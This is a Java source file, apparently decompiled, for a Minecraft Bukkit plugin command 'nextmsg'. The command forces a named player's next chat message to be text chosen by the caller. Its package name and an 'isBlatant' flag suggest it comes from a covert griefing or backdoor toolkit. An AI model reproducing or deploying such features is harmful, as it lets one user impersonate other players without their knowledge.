
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class NextmsgCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length < 2) {
            p2.sendMessage(Settings.USAGE("nextmsg <player> <msg>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                StringBuilder next = new StringBuilder();
                for (int i2 = 2; i2 != args.length; ++i2) {
                    next.append(args[i2]).append(" ");
                }
                p2.sendMessage(Settings.PREFIX(Settings.RED + target.getName() + "'s" + Settings.WHITE + " next message to chat will be " + Settings.RED + next));
                plugin.forceNextMSG.put(target, next.toString());
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

